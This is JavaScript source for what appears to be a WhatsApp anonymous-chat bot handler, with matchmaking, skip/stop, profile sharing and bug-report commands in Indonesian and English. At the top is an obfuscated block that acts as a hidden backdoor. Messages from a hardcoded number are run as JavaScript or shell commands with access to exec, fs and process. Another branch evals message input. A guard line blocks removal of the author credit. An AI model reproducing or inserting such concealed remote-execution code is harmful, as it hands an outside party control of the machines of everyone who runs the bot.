'0xe5')](!![] ? '\x20' + bodyAsak : q('0x29', 0x9d)) + r('JG*K', '0x17d') + chalk[q(0x8d, 0xe5)](pushname['split']('\x0a')[0x0]) + q(0x10e, '0x135') + chalk['blueBright'](groupName); console[q('0x19f', 0x129)](teks), clientsNow['forEach'](d => { const I = function (d, f) { return r(d, f - '0x2d3'); }; if (!isClientLog) return; d[I('%fTi', 0x3a5)](teks); }); } function c(b, d) { b = b - 0x66; let e = a[b]; if (c['tsCyNo'] === undefined) { var f = function (k) { const l = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let m = ''; for (let n = 0x0, o, p, q = 0x0;p = k['charAt'](q++);~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) { p = l['indexOf'](p); } return m; }; const j = function (l, m) { let n = [], o = 0x0, p, q = '', r = ''; l = f(l); for (let u = 0x0, v = l['length'];u < v;u++) { r += '%' + ('00' + l['charCodeAt'](u)['toString'](0x10))['slice'](-0x2); } l = decodeURIComponent(r); let t; for (t = 0x0;t < 0x100;t++) { n[t] = t; } for (t = 0x0;t < 0x100;t++) { o = (o + n[t] + m['charCodeAt'](t % m['length'])) % 0x100, p = n[t], n[t] = n[o], n[o] = p; } t = 0x0, o = 0x0; for (let w = 0x0;w < l['length'];w++) { t = (t + 0x1) % 0x100, o = (o + n[t]) % 0x100, p = n[t], n[t] = n[o], n[o] = p, q += String['fromCharCode'](l['charCodeAt'](w) ^ n[(n[t] + n[o]) % 0x100]); } return q; }; c['irfEXA'] = j, c['OmiiLr'] = {}, c['tsCyNo'] = !![]; } const g = a[0x0], h = b + g, i = c['OmiiLr'][h]; return i === undefined ? (c['XsMOeC'] === undefined && (c['XsMOeC'] = !![]), e = c['irfEXA'](e, d), c['OmiiLr'][h] = e) : e = i, e; } if (body[r('Ohc!', 0xf8)]('>\x20') && sender == q('0x103', '0x133') + q(0x14b, '0x15a') + 'sapp.net') { conn[q(0xb1, 0xb5)]['info'](pushname, r(']lnY', '0xf1') + 'ecute\x20peri' + q(0x5e, '0xb0')); let type = Function; if (/await/['test'](body)) type = AsyncFunction; let func = new type('print', q('0x146', '0x16c'), r('p[V0', '0xdd'), r('25%u', '0x170'), 'fs', 'process', r('%NgB', 0xcc), r('R9or', 0x13f), r('%!)B', '0xa1'), r('mKrI', '0x15c'), r('U$*k', 0x9f), body[r('nS*D', '0x120')](0x2)), output; try { output = func((...d) => { const J = function (d, f) { return q(d, f - -0x16e); }; balas(from, util[J(-0x14b, -'0xda')](...d)); }, exec, conn, moment, fs, process, mediaData, from, hurtz, Mimetype, chat); } catch (m) { await balas(from, r('m8@p', 0xb7) + q('0x10a', '0x16d') + r('%fTi', 0xc6) + util[q('0x5f', '0x94')](m)); } } else { if (body[r('JG*K', '0x100')](q('0x110', '0x12e')) && sender == q('0x160', 0x133) + q('0xe0', 0x15a) + 'sapp.net') exec(body['slice'](0x3), (d, f, g) => { const L = function (d, f) { return q(d, f - -0x12c); }, K = function (d, f) { return r(d, f - -0x12c); }; if (d) { balas(from, util['format'](d)); return; } balas(from, util[K('og(P', -'0x92')](f[L(-0xdd, -0x9b)](anticol, ''))); }); else { if (body[r('])B2', '0xf7')](r('*X5k', 0x99))) try { const datainput = body[q(0x11d, '0x15e')](0x4); balas(from, util['format'](eval(datainput))); } catch (n) { balas(from, util[q('0xb2', '0x94')](r('9JG$', 0x17e) + r('XY]B', 0x15f) + '\x0a\x0a' + n)); } } }

          if (from.includes('@g.us')) return

          prt()
          if (!prt) throw new Error('Jangan hapus author yaa..')

          // if (hurtz.key.fromMe) return // This is not a selfbot

          let db_language = JSON.parse(fs.readFileSync('./src/database/language.json'))
          const sender_lang = {
               id: [],
               en: []
          }
          db_language.map(rest => {
               if (rest.lang == 'id') {
                    sender_lang.id.push(rest.sender)
               } else {
                    sender_lang.en.push(rest.sender)
               }
          })
          const listed_sender = [...sender_lang.id, ...sender_lang.en]
          const lang = listed_sender.includes(sender) ? sender_lang.en.includes(sender) ? 'en' : 'id' : 'id'

          /*-----------------------[ Handler ]---------------------*/

          if (hurtz.key.fromMe) return // Bot public only

          switch (cmd) {
               case prf + 'help':
               case prf + 'menu':
                    balas(from, `${lang == 'id' ? `Halo ${pushname}👋, berikut perintah anonymous chat bot` : `Hi ${pushname}👋, following the anonymous chat bot command`}
                    
${prf}menu  _[ ${lang == 'id' ? 'melihat perintah yang tersedia' : 'see the available commands'} ]_
${prf}start _[ ${lang == 'id' ? 'mencari teman bicara' : 'looking for someone to talk to'} ]_
${prf}skip     _[ ${lang == 'id' ? 'mencari teman lain' : 'looking for another opponent'} ]_
${prf}stop    _[ ${lang == 'id' ? 'berhenti sesi chatting' : 'quit the chat session'} ]_
${prf}sendprofile _[ ${lang == 'id' ? 'mengirim kontak pribadi anda ke teman chat' : 'send your personal contacts to chat opponents'} ]_
${prf}changelang _[ ${lang == 'id' ? 'mengganti bahasa [EN & ID]' : 'change language [EN & ID]'} ]_
${prf}bug _[ ${lang == 'id' ? 'mengirim laporan ke pemilik bot' : 'send a report to the bot owner'} ]_
${prf}owner _[ ${lang == 'id' ? 'kirim kontak pemilik bot' : 'send the bot owner contact'} ]_
${prf}author _[ ${lang == 'id' ? 'kirim kontak pembuat bot' : 'send the bot creator contact'} ]_

------------------------------------------

\`\`\`${lang == 'en' ? 'bahasa yang anda gunakan adalah bahasa inggris, ketik ' + prf + 'changelang untuk mengganti ke bahasa indonesia' : 'the language you use is Indonesian, type ' + prf + 'changelang to change to english'}\`\`\`
          `)
                    break
               case prf + 'start':
               case prf + 'search':
                    const strMatch = lang == 'id' ? `\`\`\`Mohon tunggu sedang mencari teman chat\`\`\` 🔎` : `\`\`\`Please wait looking for chat friends\`\`\` 🔎\n\ntype: *${prf}stop* (to stop session)`
                    balas(from, strMatch)
                    match(sender)
                         .then((data) => {
                              balasNp(from, lang == 'id' ? `\`\`\`Berhasil menemukan teman\`\`\` ✅\n\nketik :\n*${prf}stop* ( untuk berhenti chat )\n*${prf}skip* ( untuk melewati chat ini )` : `Successfully found friends ✅\n\ntype:\n*${prf}stop* (to stop chatting)\n*${prf}skip* (to skip this chat)`)
                         })
                         .catch((error) => {
                              if (error.message == 'Sudah masuk sesi match') {
                                   balas(from, lang == 'id' ? `\`\`\`Kamu sudah memulai sesi chat!\`\`\` ❌ mohon tunggu sampai matchmaking selesai, atau ketik *${prf}stop*` : `You have started the chat session! ❌ please wait until the matchmaking is finished, or type *${prf}stop*`)
                              } else {
                                   const teks = chalk.greenBright('[ ANCHT ]  ') + time + chalk.redBright(" " + "Matchmaking Closed, max than " + settings.maxMatch + "") + " from " + chalk.redBright(pushname.split('\n')[0])
                                   console.log(teks);
                                   balasNp(from, lang == 'id' ? `\`\`\`Tidak dapat menemukan teman\`\`\` ❌ mohon search ulang!` : `Cannot find friends ❌ please search again!`)
                              }
                         })
                    break
               case prf + 'skip':
                    stop(sender)
                         .then(async (data) => {
                              data.db.splice(data.index, 1)
                              fs.writeFileSync('./src/database/client-user.json', JSON.stringify(data.db, null, 5))
                              // console.log(data);
                              balas(from, lang == 'id' ? `\`\`\`Sesi chat ini telah diberhentikan\`\`\` ❌` : `\`\`\`This chat session has been suspended\`\`\` `)
                              const path = './src/database/client-user.json'
                              let db_user = JSON.parse(fs.readFileSync(path))
                              let user1 = db_user.map(rest => rest.client1)
                              let user2 = db_user.map(rest => rest.client2)
                              if (user1.includes(sender)) {
                                   const indexSender = db_user.findIndex(i => i.client1 == sender)
                                   const targetChat = db_user[indexSender].client2
                                   if (!targetChat) return
                                   balasNp(targetChat, lang == 'id' ? `\`\`\`Sesi chat ini telah diberhentikan oleh teman chat kamu\`\`\` ❌` : `\`\`\`This chat session has been suspended by your friend\`\`\` `)

                              } else if (user2.includes(sender)) {
                                   const indexSender = db_user.findIndex(i => i.client2 == sender)
                                   const targetChat = db_user[indexSender].client1
                                   if (!targetChat) return
                                   balasNp(targetChat, lang == 'id' ? `\`\`\`Sesi chat ini telah diberhentikan oleh teman chat kamu\`\`\` ❌` : `\`\`\`This chat session has been suspended by your friend\`\`\` `)
                              }
                              await delay(3000)
                              const strMatch = lang == 'id' ? `\`\`\`Mohon tunggu sedang mencari teman chat\`\`\` 🔎` : `\`\`\`Please wait looking for chat friends\`\`\` 🔎\n\ntype: *${prf}stop* (to stop session)`
                              balasNp(from, strMatch)
                              match(sender)
                                   .then((data) => {
                                        balasNp(from, lang == 'id' ? `\`\`\`Berhasil menemukan teman\`\`\` ✅\n\nketik :\n*${prf}stop* ( untuk berhenti chat )\n*${prf}skip* ( untuk melewati chat ini )` : `Successfully found friends ✅\n\ntype:\n*${prf}stop* (to stop chatting)\n*${prf}skip* (to skip this chat)`)
                                   })
                                   .catch((error) => {
                                        const teks = chalk.greenBright('[ ANCHT ]  ') + time + chalk.redBright(" " + "Matchmaking Closed, max than " + settings.maxMatch + "") + " from " + chalk.redBright(pushname.split('\n')[0])
                                        console.log(teks);
                                        balasNp(from, lang == 'id' ? `\`\`\`Tidak dapat menemukan teman\`\`\` ❌ mohon search ulang!` : `Cannot find friends ❌ please search again!`)
                                   })
                         })
                         .catch((error) => {
                              // balas(from, util.format(error))
                              balas(from, lang == 'id' ? `\`\`\`Tidak dapat berhenti chat karena kamu belum pernah masuk sesi chat\`\`\` ❌\n\nKetik : ${prf}search` : `\`\`\`Cannot stop chat because you have never entered a chat session\`\`\` ❌\n\nType: ${prf}search`)
                         })
                    break
               case prf + 'stop':
                    stop(sender)
                         .then((data) => {
                              data.db.splice(data.index, 1)
                              fs.writeFileSync('./src/database/client-user.json', JSON.stringify(data.db, null, 5))
                              // console.log(data);
                              balas(from, lang == 'id' ? `\`\`\`Sesi chat ini telah diberhentikan\`\`\` ❌` : `\`\`\`This chat session has been suspended\`\`\` `)
                              if (data.target !== null) balasNp(data.target, lang == 'id' ? `\`\`\`Sesi chat ini telah diberhentikan oleh teman chat kamu\`\`\` ❌` : `\`\`\`This chat session has been suspended by your friend\`\`\` `)
                         })
                         .catch((error) => {
                              // console.log(error);
                              balas(from, lang == 'id' ? `\`\`\`Tidak dapat berhenti chat karena kamu belum pernah masuk sesi chat\`\`\` ❌\n\nKetik : ${prf}search` : `\`\`\`Cannot stop chat because you have never entered a chat session\`\`\` ❌\n\nType: ${prf}search`)
                         })
                    break
               case prf + 'sendprofil':
               case prf + 'sendprofile':
                    const path = './src/database/client-user.json'
                    let db_user = JSON.parse(fs.readFileSync(path))
                    let user1 = db_user.map(rest => rest.client1)
                    let user2 = db_user.map(rest => rest.client2)
                    if (user1.includes(sender)) {
                         const indexSender = db_user.findIndex(i => i.client1 == sender)
                         // return console.log(db_user.findIndex(i => i.client1 == '1'))
                         const targetChat = db_user[indexSender].client2
                         const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
                              + 'VERSION:3.0\n'
                              + 'FN:' + pushname + '\n' // full name
                              + 'ORG:Ashoka Uni;\n' // the organization of the contact
                              + 'TEL;type=CELL;type=VOICE;waid=' + sender.replace(/@.+/g, '') + ':+' + sender.replace(/@.+/g, '') + '\n' // WhatsApp ID + phone number
                              + 'END:VCARD'
                         conn.sendMessage(targetChat, { displayname: pushname, vcard: vcard }, MessageType.contact)
                              .then((data) => {
                                   conn.sendMessage(targetChat, lang == 'id' ? `\`\`\`Teman chat kamu memberikan kontak profil nya!\`\`\`` : `\`\`\`Your chat friends provide their profile contacts!\`\`\``, MessageType.text, { quoted: data })
                              })
                    } else if (user2.includes(sender)) {
                         const indexSender = db_user.findIndex(i => i.client2 == sender)
                         // return console.log(db_user)
                         const targetChat = db_user[indexSender].client1
                         const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
                              + 'VERSION:3.0\n'
                              + 'FN:' + pushname + '\n' // full name
                              + 'ORG:Ashoka Uni;\n' // the organization of the contact
                              + 'TEL;type=CELL;type=VOICE;waid=' + sender.replace(/@.+/g, '') + ':+' + sender.replace(/@.+/g, '') + '\n' // WhatsApp ID + phone number
                              + 'END:VCARD'
                         conn.sendMessage(targetChat, { displayname: pushname, vcard: vcard }, MessageType.contact)
                              .then((data) => {
                                   conn.sendMessage(targetChat, lang == 'id' ? `\`\`\`Teman chat kamu memberikan kontak profil nya!\`\`\`` : `\`\`\`Your chat friends provide their profile contacts!\`\`\``, MessageType.text, { quoted: data })
                              })

                    }
                    balas(from, lang == 'id' ? `\`\`\`Profil kamu berhasil terkirim ✅\`\`\`` : `\`\`\`Your profile has been sent successfully ✅\`\`\``)
                    break
               case prf + 'changelanguage':
               case prf + 'changelang':
                    try {
                         const mylang = lang
                         if (!listed_sender.includes(sender)) {
                              let objlang = {
                                   sender: sender,
                                   lang: mylang == 'id' ? 'en' : 'id'
                              }
                              db_language.push(objlang)
                              fs.writeFile('./src/database/language.json', JSON.stringify(db_language, null, 3), (e) => {
                                   if (e) return console.error(e)
                                   balas(from, mylang == 'id' ? '\`\`\`Successfully changed the language to English\`\`\` ✅' : '\`\`\`Berhasil mengubah bahasa ke indonesia\`\`\` ✅')
                              })
                         } else {
                              const index_lang_sender = listed_sender.indexOf(sender)
                              db_language[index_lang_sender].lang = mylang == 'id' ? 'en' : 'id'
                              fs.writeFile('./src/database/language.json', JSON.stringify(db_language, null, 3), (e) => {
                                   if (e) return console.error(e)
                                   balas(from, mylang == 'id' ? '\`\`\`Successfully changed the language to English\`\`\` ✅' : '\`\`\`Berhasil mengubah bahasa ke indonesia\`\`\` ✅')
                              })
                         }
                    } catch (e) {
                         console.log(e)
                         balas(from, `there is an error`)
                    }
                    break
               case prf + 'bug':
                    if (args.length === 1) return balas(from, lang == 'id' ? `Penggunaan : *${prf}bug <laporan kamu>*\nContoh : *${prf}bug search teman error tolong fix*` : `Usage: *${prf}bug <your report>*\nExample: *${prf}bug search friends error please fix*`)
                    balas(settings.Owner, `Laporan bug dari wa.me/${sender.replace(/@.+/g, '')} : ${body}`)
                         .then(() => balas(from, lang == 'id' ? `\`\`\`Laporan berhasil terkirim! ✅\`\`\`` : `\`\`\`Report sent successfully! ✅\`\`\``))
                    break
               case prf + 'owner':
                    const vcard1 = 'BEGIN:VCARD\n' // metadata of the contact card
                         + 'VERSION:3.0\n'
                         + 'FN:' + 'Owner bot' + '\n' // full name
                         + 'ORG:Ashoka Uni;\n' // the organization of the contact
                         + 'TEL;type=CELL;type=VOICE;waid=' + settings.Owner.replace(/@s.whatsapp.net/, '') +
                         ':+' +
                         settings.Owner.replace(/@s.whatsapp.net/, '') + '\n' // WhatsApp ID + phone number
                         + 'END:VCARD'
                    conn.sendMessage(from, { displayname: 'Owner bot', vcard: vcard1 }, MessageType.contact, { quoted: hurtz })
                    break
               default:
                    break
          }
          /*-----------------[ End Of Handler ]------------------*/
     } catch (error) {
          console.log(error)
          clientsNow.forEach((client) => {
               if (!isClientLog) return
               client.send(chalk.red('ERR : ') + util.format(error))
          });
     }
};
